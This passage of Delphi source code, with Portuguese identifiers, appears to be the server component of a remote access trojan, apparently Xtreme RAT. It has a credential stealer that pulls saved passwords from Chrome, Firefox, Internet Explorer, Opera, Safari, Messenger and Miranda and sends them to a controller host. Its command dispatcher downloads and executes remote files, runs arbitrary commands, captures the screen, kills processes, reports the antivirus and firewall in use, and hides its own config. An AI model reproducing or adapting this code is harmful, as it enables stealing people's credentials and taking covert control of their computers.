  Host := xHost;
  Port := xPort;
  inherited Create(True);
end;

procedure TNewEnviarMouse.Execute;
begin
  EnviarImagensMouse(Host, Port);
end;

type
  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: LPCWSTR;
  end;
  PCRYPTPROTECT_PROMPTSTRUCT = ^_CRYPTPROTECT_PROMPTSTRUCT;
  _CRYPTOAPI_BLOB = record
    cbData: DWORD;
    pbData: PBYTE;
  end;
  DATA_BLOB = _CRYPTOAPI_BLOB;
  PDATA_BLOB = ^DATA_BLOB;

function CryptUnprotectData(pDataIn: PDATA_BLOB;
                            ppszDataDescr: PLPWSTR;
                            pOptionalEntropy: PDATA_BLOB;
                            pvReserved: Pointer;
                            pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT;
                            dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall; external 'crypt32.dll' Name 'CryptUnprotectData';

Function ExtractLastFolder(FolderPath: WideString): WideString;
var
  i: integer;
begin
  if FolderPath[Length(FolderPath)] = '\' then Delete(FolderPath, Length(FolderPath), 1);
  i := Length(FolderPath);
  While ((i > 0) and (FolderPath[i] <> '\')) do
  begin
    Result := FolderPath[i] + Result;
    dec(i);
  end;
end;

function FGetPassword: widestring;
var
  TempStr: widestring;
  Arquivo: WideString;
  Size: int64;
  p: pointer;
  Filename, s, sTotal: WideString;
  TempAnsi: AnsiString;
begin
  TempStr := '';

  TempStr := GetSafariPasswords(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'SAFARI|' + TempStr + DelimitadorComandos;

  TempStr := GetGTalkPW(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'GTALK|' + TempStr + DelimitadorComandos;






  TempStr := Mozilla3_5Password(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'FF|' + TempStr + DelimitadorComandos;

  TempStr := GetWindowsLiveMessengerPasswords(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'MSN|' + TempStr + DelimitadorComandos;

  TempStr := GetFirefoxPasswords(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'FF|' + TempStr + DelimitadorComandos;

  TempStr := GetIELoginPass(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'IE|' + TempStr + DelimitadorComandos;

  TempStr := GrabAllIEpasswords(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'IE|' + TempStr + DelimitadorComandos;

  TempStr := ShowAllIeAutocompletePWs(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'IE|' + TempStr + DelimitadorComandos;

  TempStr := ShowAllIEWebCert(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'IE|' + TempStr + DelimitadorComandos;

  TempStr := noip_DUCpasswords(DelimitadorComandosPassword);
  if TempStr <> '' then Result := Result + 'NOIP|' + TempStr + DelimitadorComandos;

  Arquivo := GetShellFolder($001A) + '\Opera\Opera\wand.dat';
  if fileexists(pWideChar(Arquivo)) then
  begin
    TempStr := GetOperaPasswords(pWideChar(Arquivo), DelimitadorComandosPassword);
    if TempStr <> '' then Result := Result + 'OPERA|' + TempStr + DelimitadorComandos;
  end;

  Arquivo := GetShellFolder($001C) + '\Google\Chrome\User Data\Default\Login Data'; //ou "web data" no antigo
  if FileExists(pWideChar(Arquivo)) then
  begin
    Size := LerArquivo(pWideChar(Arquivo), p);
    SetLength(TempStr, Size div 2);
    CopyMemory(@TempStr[1], p, Size);
    Result := Result + 'CHROME|' + TempStr + DelimitadorComandos;
  end;

  Arquivo := GetShellFolder($001C) + '\Google\Chrome\User Data\Default\Web Data';
  if FileExists(pWideChar(Arquivo)) then
  begin
    Size := LerArquivo(pWideChar(Arquivo), p);
    SetLength(TempStr, Size div 2);
    CopyMemory(@TempStr[1], p, Size);
    Result := Result + 'CHROME|' + TempStr + DelimitadorComandos;
  end;

  s := GetShellFolder(26) + '\Miranda';
  sTotal := ListDirs(s, False);
  s := '';

  while posex(#13#10, sTotal) > 0 do
  begin
    TempStr := '';
    s := '';
    FileName := '';

    s := Copy(sTotal, 1, posex(#13#10, sTotal) - 1);
    Delete(sTotal, 1, posex(#13#10, sTotal) + 1);
    Filename := ExtractLastFolder(S);
    if s[Length(s)] <> '\' then s := s + '\';
    s := s + FileName + '.dat';

    if FileExists(pWideChar(s)) then
    begin
      Size := LerArquivo(pWideChar(s), p);
      SetLength(TempAnsi, Size);
      CopyMemory(@TempAnsi[1], p, Size);
      Result := Result + 'MIRANDA|' + GetMirandaPasswords(TempAnsi, DelimitadorComandosPassword) + DelimitadorComandos;
    end;
  end;
end;

type
  TPassword = class(TThread)
  private
    Host: ansistring;
    Port: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer);
  end;

constructor TPassword.Create(xHost: ansistring;
                             xPort: integer);
begin
  Host := xHost;
  Port := xPort;
  inherited Create(True);
end;

procedure TPassword.Execute;
var
  Command: widestring;
  TempStr: widestring;
begin
  TempStr := FGetPassword;
  Command := unitconstantes.NEWCONNECTION + '|' +
             ConnectionID +
             DelimitadorComandos +
             GETPASSWORDS + '|' + TempStr;
  NewConnection(Host,
                Port,
                Command,
                True);
  while true do sleep(infinite);				
end;

type
  TDownloadFolder = class(TThread)
  private
    Host: ansistring;
    Port: integer;
    PathName: widestring;
    FileName: widestring;
    InDir: boolean;
  protected
    procedure Execute; override;
  public
    constructor Create(xHost: ansistring;
                       xPort: integer;
                       xPathName: widestring;
                       xFileName: widestring;
                       xInDir: boolean);
  end;

constructor TDownloadFolder.Create(xHost: ansistring;
                                  xPort: integer;
                                  xPathName: widestring;
                                  xFileName: widestring;
                                  xInDir: boolean);
begin
  Host := xHost;
  Port := xPort;
  PathName := xPathName;
  FileName := xFileName;
  InDir := xInDir;
  inherited Create(True);
end;

procedure TDownloadFolder.Execute;
var
  Command: widestring;
begin
  SearchDownFolderStop := true;
  sleep(100);

  SearchDownFolderStop := false;
  SearchDownFolderResult := '';
  DownloadFolderSearch(PathName, FileName, InDir);
  SearchDownFolderStop := true;

  Command := unitconstantes.NEWCONNECTION + '|' +
             ConnectionID +
             DelimitadorComandos +
             FILEMANAGERNEW + '|' +
             FMDOWNLOADFOLDERADD + '|' + SearchDownFolderResult;

  NewConnection(Host,
                Port,
                Command,
                True);
  SearchDownFolderResult := '';
end;

// copiar diretório
const
  FO_COPY = $0002;
  FOF_NOCONFIRMATION = $0010;
  FOF_RENAMEONCOLLISION = $0008;

type
  FILEOP_FLAGS = Word;

type
  PRINTEROP_FLAGS = Word;

  PSHFileOpStructW = ^TSHFileOpStructW;
  PSHFileOpStruct = PSHFileOpStructW;
  _SHFILEOPSTRUCTW = packed record
    Wnd: HWND;
    wFunc: UINT;
    pFrom: PWideChar;
    pTo: PWideChar;
    fFlags: FILEOP_FLAGS;
    fAnyOperationsAborted: BOOL;
    hNameMappings: Pointer;
    lpszProgressTitle: PWideChar;
  end;
  _SHFILEOPSTRUCT = _SHFILEOPSTRUCTW;
  TSHFileOpStructW = _SHFILEOPSTRUCTW;
  TSHFileOpStruct = TSHFileOpStructW;

function StrLen(const Str: PWideChar): Cardinal;
asm
  {Check the first byte}
  cmp word ptr [eax], 0
  je @ZeroLength
  {Get the negative of the string start in edx}
  mov edx, eax
  neg edx
@ScanLoop:
  mov cx, word ptr [eax]
  add eax, 2
  test cx, cx
  jnz @ScanLoop
  lea eax, [eax + edx - 2]
  shr eax, 1
  ret
@ZeroLength:
  xor eax, eax
end;

function StrLCopy(Dest: PWideChar; const Source: PWideChar; MaxLen: Cardinal): PWideChar;
var
  Len: Cardinal;
begin
  Result := Dest;
  Len := StrLen(Source);
  if Len > MaxLen then
    Len := MaxLen;
  Move(Source^, Dest^, Len * SizeOf(WideChar));
  Dest[Len] := #0;
end;

function StrPCopyW(Dest: PWideChar; const Source: WideString): PWideChar;
begin
  Result := StrLCopy(Dest, PWideChar(Source), Length(Source));
end;

function MySHFileOperation(const lpFileOp: TSHFileOpStruct): Integer;
var
  xSHFileOperation: function(const lpFileOp: TSHFileOpStruct): Integer; stdcall;
begin
  xSHFileOperation := GetProcAddress(LoadLibraryW('shell32.dll'), 'SHFileOperationW');
  Result := xSHFileOperation(lpFileOp);
end;

function CopyDirectory(const Hwd: LongWord; const SourcePath, DestPath : pWideChar): boolean;
var
  OpStruc: TSHFileOpStruct;
  frombuf, tobuf: Array [0..MAX_PATH] of WideChar;
Begin
  Result := false;
  FillChar(frombuf, Sizeof(frombuf), 0);
  FillChar(tobuf, Sizeof(tobuf), 0);
  StrPCopyW(frombuf, SourcePath);
  StrPCopyW(tobuf, DestPath);
  With OpStruc DO Begin
    Wnd:= Hwd;
    wFunc:= FO_COPY;
    pFrom:= @frombuf;
    pTo:=@tobuf;
    fFlags:= FOF_NOCONFIRMATION or FOF_RENAMEONCOLLISION;
    fAnyOperationsAborted:= False;
    hNameMappings:= Nil;
    lpszProgressTitle:= Nil;
  end;
  if myShFileOperation(OpStruc) = 0 then Result := true;
end;

// fim copiar diretório

procedure ExecutarComando(ComandoRecebido: WideString); stdcall;
var
  InformacoesDoServidor: TServerINFO;
   TempStr, ToSend, TempStr1, TempStr2, TempStr3, TempStr4, TempStr5: Widestring;
   Recebido: Widestring;
  SecurityCenterInfo: TSecurityCenterInfo;
  AV, FW: WideString;
  LittleInt: integer;
  p: pointer;
  TempInt, TempInt1, TempInt2: int64;
  NewUpload: TNewUpload;
  TempMutex: cardinal;
  CPUTemp: TCpuUsage;
  TempBool: boolean;
  CrazyWin: TCrazyWin;
  Result: TSplit;
  ShellThread: TNewConnectionThread;
  VarThread, VarThread2: TNewConnectionThread;
  EnviarThumbs: TGetThumbs;
  ProcurarArquivos: TSearchFiles;
  CopmLAN: TComputersLAN;
  NewDownload: TNewDownload;
  NewResumeDownload: TNewResumeDownload;
  NewFTPThread: TNewFTPThread;
  FileExistsComputer: TFileExistsComputer;
  DownloadAll: TDownloadAll;
  DeviceClassesCount, DevicesCount: integer;
  MyMessage: TMessageBox;
  DC: HDC;
  k: TKeys;
  DesktopThread: TNewConnectionThread;
  Point: TPoint;
  MouseButton, delay: integer;
  AudioThread: TNewConnectionThread;
  NewEnviarMouse: TNewEnviarMouse;
  Password: TPassword;
  Giren: DATA_BLOB;
  Cikan: DATA_BLOB;
  TempStream, Config: TMemoryStream;
  TempStrAnsi: AnsiString;
  DownFolder: TDownloadFolder;
  Rect: TRect;
{
  MyObject: TMyObject;
  : TMemoryStream;
  PCname, PCuser: WideString;
}
begin
  Recebido := ComandoRecebido;
  ComandoRecebido := '';

  if Recebido <> '' then PostMessage(ServerObject.Handle, WM_LASTPING, 0, 0) else Exit;
  LastPing := GetTickCount;

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = PING then
  begin
    ToSend := PONG + '|' + IntToStr(SecondsIdle) + '|' + ActiveCaption;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = DESINSTALAR then
  begin
    IniciarDesinstalacao := True;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = MAININFO then
  begin




    FillChar(InformacoesDoServidor, SizeOf(InformacoesDoServidor), #0);

    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    ConnectionID := Recebido;

    ZeroMemory(@InformacoesDoServidor, SizeOf(TServerINFO));

    SecurityCenterInfo := TSecurityCenterInfo.Create;
    GetSecInfo(AntiVirusProduct, SecurityCenterInfo);
    AV := SecurityCenterInfo.displayName;
    if AV <> '' then delete(AV, Length(AV), 1);
    SecurityCenterInfo.Free;

    SecurityCenterInfo := TSecurityCenterInfo.Create;
    GetSecInfo(FirewallProduct, SecurityCenterInfo);
    FW := SecurityCenterInfo.displayName;
    if FW <> '' then delete(FW, Length(FW), 1);
    SecurityCenterInfo.Free;

    if SendMessage(ServerObject.Handle, WM_WEBCAMDIRECTX, 0, 0) = 1 then TempStr := 'X' else TempStr := '-';

    if TempStr = '-' then WebcamType := 1;

    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.CAM), InformacoesDoServidor.CAM);
    InformacoesDoServidor.ImagemBandeira := GetCountryCode(GetCountryAbreviacao);
    InformacoesDoServidor.ImagemDesktop := -1;
    InformacoesDoServidor.ImagemCam := -1;

    TempStr := GetNewGroupName('');
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.GroupName), InformacoesDoServidor.GroupName);

    TempStr := GetNewIdentificationName('') + '_' + DiskSerialName;
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.NomeDoServidor), InformacoesDoServidor.NomeDoServidor);

    TempStr := GetCountryName('', InformacoesDoServidor.ImagemBandeira);
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.Pais), InformacoesDoServidor.Pais);

    StrToAnyArray(' ', SizeOf(InformacoesDoServidor.IPWAN), InformacoesDoServidor.IPWAN);

    TempStr := MainIdTCPClient.Socket.Binding.IP;
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.IPLAN), InformacoesDoServidor.IPLAN);

    if IsAdministrator = True then TempStr := 'Admin' else TempStr := 'Limited';
    if Is64BitOS = True then TempStr1 := '(x64)' else TempStr1 := '(x86)';
    TempStr := TempStr + ' ' + TempStr1;
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.Account), InformacoesDoServidor.Account);

    TempStr := GetPCName + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.NomeDoComputador), InformacoesDoServidor.NomeDoComputador);

    TempStr := GetPCUser + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.NomeDoUsuario), InformacoesDoServidor.NomeDoUsuario);

    TempStr := PASSID + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.PASSID), InformacoesDoServidor.PASSID);

    TempStr := GetOS + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.SistemaOperacional), InformacoesDoServidor.SistemaOperacional);

    TempStr := MegaTrim(GetCPU) + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.CPU), InformacoesDoServidor.CPU);

    TempStr := inttostr(GetRAMSize(smTotalPhys));
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.RAM), InformacoesDoServidor.RAM);

    TempStr := AV + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.AV), InformacoesDoServidor.AV);

    TempStr := FW + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.FW), InformacoesDoServidor.FW);

    TempStr := WideString(ConfiguracoesServidor.Versao);
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.Versao), InformacoesDoServidor.Versao);

    InformacoesDoServidor.Porta := MainIdTCPClient.Socket.Binding.PeerPort;
    InformacoesDoServidor.Ping := 0;
    InformacoesDoServidor.ImagemPing := -1;
    InformacoesDoServidor.Idle := SecondsIdle;

    TempStr := ActiveCaption + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.JanelaAtiva), InformacoesDoServidor.JanelaAtiva);

    TempStr := GetFirstExecution + ' ';
    StrToAnyArray(TempStr, SizeOf(InformacoesDoServidor.PrimeiraExecucao), InformacoesDoServidor.PrimeiraExecucao);

    setlength(ToSend, SizeOf(TServerINFO));

    CopyMemory(@ToSend[1], @InformacoesDoServidor, SizeOf(TServerINFO));
    ToSend := MAININFO + DelimitadorComandos + ToSend;

    // sendmessage to ServerObject...
    LittleInt := Length(ToSend) * 2;
    GetMem(p, LittleInt);
    CopyMemory(p, @ToSend[1], LittleInt);
    PostMessage(ServerObject.Handle, WM_MAININFO, LittleInt, integer(p));
    sleep(100);
    SendMessage(ServerObject.Handle, WM_WEBCAMLIST, 0, 0);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETDESKTOPPREVIEW then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt2 := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));

    GetClientRect(GetDesktopWindow, Rect);
    TempInt := round((Rect.Right - Rect.Left) * (TempInt2 / 480));
    TempInt1 := round((Rect.Bottom - Rect.Top) * (TempInt2 / 480));

    TempStr := GetDesktopImage(50, TempInt, TempInt1);
    ToSend := GETDESKTOPPREVIEW + '|' + TempStr;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETDESKTOPPREVIEWINFO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    TempInt2 := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    TempStr := GetDesktopImage(50, TempInt2, TempInt);
    ToSend := GETDESKTOPPREVIEWINFO + '|' + TempStr;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = RECONECTAR then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr := Recebido;

    ReconectarServer := True;
    ReconectarServerHost := Copy(TempStr, 1, posex(':', TempStr) - 1);
    delete(TempStr, 1, posex(':', TempStr));
    ReconectarServerPort := StrToInt(TempStr);
    DesconectarServidor := true;
  end else
  
  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = RENOMEAR then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr := Recebido;
    TempStr := GetNewIdentificationName(TempStr) + '_' + DiskSerialName;
    GlobalVars.MainIdTCPClient.EnviarString(RENOMEAR + DelimitadorComandos + TempStr);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = CHANGEGROUP then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr := Recebido;
    TempStr := GetNewGroupName(TempStr);
    GlobalVars.MainIdTCPClient.EnviarString(CHANGEGROUP + DelimitadorComandos + TempStr);
  end else
  
  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPDATESERVERLOCAL then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempStr := Recebido;

    TempStr1 := unitconstantes.NEWCONNECTION + '|' +
                ConnectionID +
                DelimitadorComandos +
                UPDATESERVERLOCAL +
                DelimitadorComandos +
                TempStr;

    NewUpload := TNewUpload.Create(MainIdTCPClient.Host,
                                   MainIdTCPClient.Port,
                                   '',
                                   0,
                                   TempStr1);
    NewUpload.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CHANGESERVERSETTINGS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    if copy(Recebido, 1, posex('|', Recebido) - 1) = 'Y' then TempBool := True else TempBool := False;
    delete(Recebido, 1, posex('|', Recebido));

	  TempStr := ServerConfigFileName;
    SetFileAttributesW(pWideChar(TempStr), FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(pWideChar(TempStr));
    CriarArquivo(pWideChar(TempStr), pWideChar(Recebido), Length(Recebido) * 2);
    HideFilename(pWideChar(TempStr));

    if ConfiguracoesServidor.Mutex <> '' then DeletarChave(HKEY_CURRENT_USER, 'SOFTWARE\' + ConfiguracoesServidor.Mutex);

    if TempBool = False then Exit;



    CreateMutexW(nil, False, ConfiguracoesServidor.MutexSair);
    sleep(5000); // tempo de intervalo do persist

    TempMutex := CreateMutexW(nil, False, 'XTREMEUPDATE');
    if shellexecute(0, 'open', pWideChar(InstalledServer), nil, nil, SW_NORMAL) > 32 then
    begin
      sleep(1000);
      ExitProcess(0)
    end else CloseHandle(TempMutex);

  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = UPDATESERVERLINK then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    TempStr := MyTempFolder + InttoStr(GetTickCount) + ExtractFileExt(Recebido);
    try
      URLDownloadToFile(nil,
                        pWideChar(Recebido),
                        pWideChar(TempStr),
                        0,
                        nil);
      finally
      TempMutex := CreateMutexW(nil, False, 'XTREMEUPDATE');
      if shellexecute(0, 'open', pWideChar(TempStr), nil, nil, SW_NORMAL) > 32 then
      IniciarDesinstalacao := True else CloseHandle(TempMutex);
    end;
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = EXECCOMANDO then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr := Recebido;
    TempStr1 := '';

    if posex(' ', TempStr) > 1 then
    begin
      TempStr1 := TempStr;
      TempStr := copy(TempStr1, 1, posex(' ', TempStr1) - 1);
      delete(TempStr1, 1, posex(' ', TempStr1));
    end;
    ExecuteCommand(TempStr, TempStr1, SW_NORMAL);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = DOWNEXEC then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempStr := MyTempFolder + InttoStr(GetTickCount) + ExtractFileExt(Recebido);
    try
      URLDownloadToFile(nil,
                        pWideChar(Recebido),
                        pWideChar(TempStr),
                        0,
                        nil);
      shellexecute(0, 'open', pWideChar(TempStr), nil, pWideChar(MyTempFolder), SW_NORMAL);
      except
    end;

  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = OPENWEB then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempStr := WideString(GetDefaultBrowser);
    shellexecute(0, 'open', pWideChar(TempStr), pWideChar(Recebido), nil, SW_SHOWMAXIMIZED);
  end else

  if copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1) = UPLOADANDEXECUTE then
  begin
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));
    TempStr := Recebido;

    TempStr1 := unitconstantes.NEWCONNECTION + '|' +
                ConnectionID +
                DelimitadorComandos +
                UPLOADANDEXECUTE +
                DelimitadorComandos +
                TempStr;

    NewUpload := TNewUpload.Create(MainIdTCPClient.Host,
                                   MainIdTCPClient.Port,
                                   '',
                                   0,
                                   TempStr1);
    NewUpload.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = GETPROCESSLIST then
  begin
    ToSend := PROCESS + '|' + GETPROCESSLIST + '|' + IntToStr(GetCurrentProcessId) + DelimitadorComandos + ProcessList;
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = CPUUSAGE then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));
    CPUTemp := TCpuUsage.Create(MainIdTCPClient.Host,
                                MainIdTCPClient.Port,
                                TempInt);
    CPUTemp.Resume;
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = KILLPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if KillProc(TempInt) = true then
    ToSend := PROCESS + '|' + KILLPROCESSID + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := PROCESS + '|' + KILLPROCESSID + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = SUSPENDPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if SuspendProcess(TempInt) = true then
    ToSend := PROCESS + '|' + SUSPENDPROCESSID + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := PROCESS + '|' + SUSPENDPROCESSID + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = RESUMEPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ResumeProcess(TempInt) = true then
    ToSend := PROCESS + '|' + RESUMEPROCESSID + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := PROCESS + '|' + RESUMEPROCESSID + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEJANELAS then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    if copy(Recebido, 1, posex('|', Recebido) - 1) = 'T' then
    ToSend := JANELAS + '|' +
              LISTADEJANELAS + '|' +
              WindowList(True) else
    ToSend := JANELAS + '|' +
              LISTADEJANELAS + '|' +
              WindowList(False);
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = FECHARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if PostMessage(TempInt, WM_CLOSE, 0, 0) = true then
    ToSend := JANELAS + '|' + FECHARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + FECHARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = HABILITARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    TempBool := EnableWindow(TempInt, True);
    if TempBool = false then TempBool := EnableWindow(TempInt, True);
    if TempBool = true then
    ToSend := JANELAS + '|' + HABILITARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + HABILITARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = DESABILITARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    TempBool := EnableWindow(TempInt, False);
    if TempBool = false then TempBool := EnableWindow(TempInt, False);
    if TempBool = true then
    ToSend := JANELAS + '|' + DESABILITARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + DESABILITARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = OCULTARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ShowWindow(TempInt, SW_HIDE) = true then
    ToSend := JANELAS + '|' + OCULTARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + OCULTARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MOSTRARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ShowWindow(TempInt, SW_NORMAL) = true then
    ToSend := JANELAS + '|' + MOSTRARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + MOSTRARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MINIMIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ShowWindow(TempInt, SW_SHOWMINIMIZED) = true then
    ToSend := JANELAS + '|' + MINIMIZARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + MINIMIZARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = MAXIMIZARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ShowWindow(TempInt, SW_SHOWMAXIMIZED) = true then
    ToSend := JANELAS + '|' + MAXIMIZARJANELA + '|' + 'T' + '|' + IntToStr(TempInt) + '|' else
    ToSend := JANELAS + '|' + MAXIMIZARJANELA + '|' + 'F' + '|' + IntToStr(TempInt) + '|';
    GlobalVars.MainIdTCPClient.EnviarString(ToSend);
  end else

  if copy(Recebido, 1, posex('|', Recebido) - 1) = RESTAURARJANELA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(copy(Recebido, 1, posex('|', Recebido) - 1));

    if ShowWindow(TempInt, SW_RESTORE) = true then
